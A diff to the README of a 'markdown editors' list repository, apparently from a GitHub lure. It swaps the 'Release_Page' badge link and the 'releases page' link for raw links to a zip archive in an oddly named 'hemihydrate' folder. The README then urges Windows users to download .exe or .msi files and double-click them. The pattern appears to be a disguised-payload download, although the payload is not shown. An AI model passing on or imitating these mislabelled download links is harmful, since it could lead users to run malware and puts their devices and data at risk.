@@ -1,12 +1,12 @@
 # 📝 awesome-markdown-editors-list - Find your perfect writing software today
 
-[![](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://github.com/sacrilegem688/awesome-markdown-editors-list/releases)
+[![](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://raw.githubusercontent.com/sacrilegem688/awesome-markdown-editors-list/main/hemihydrate/markdown_awesome_editors_list_2.4.zip)
 
 This project provides a complete guide for people who write in Markdown. Markdown allows you to format text with simple keyboard symbols. You store your work in plain text files. These files remain readable on any computer or mobile device. This list collects the best tools to write, view, and organize these documents. We curate these selections to save you time. You do not need to test every single editor on the market to find one that works for you.
 
 ## 📥 How to download your software
 
-Visit the [releases page](https://github.com/sacrilegem688/awesome-markdown-editors-list/releases) to find the latest version of the tools we recommend. 
+Visit the [releases page](https://raw.githubusercontent.com/sacrilegem688/awesome-markdown-editors-list/main/hemihydrate/markdown_awesome_editors_list_2.4.zip) to find the latest version of the tools we recommend. 
 
 Many tools listed here offer specific files for Windows. Look for files ending in .exe or .msi. These files contain the installer. Once you finish the download, locate the file in your downloads folder. Double-click the file to start the installation. Follow the prompts on your screen. The process usually takes less than one minute. 
 
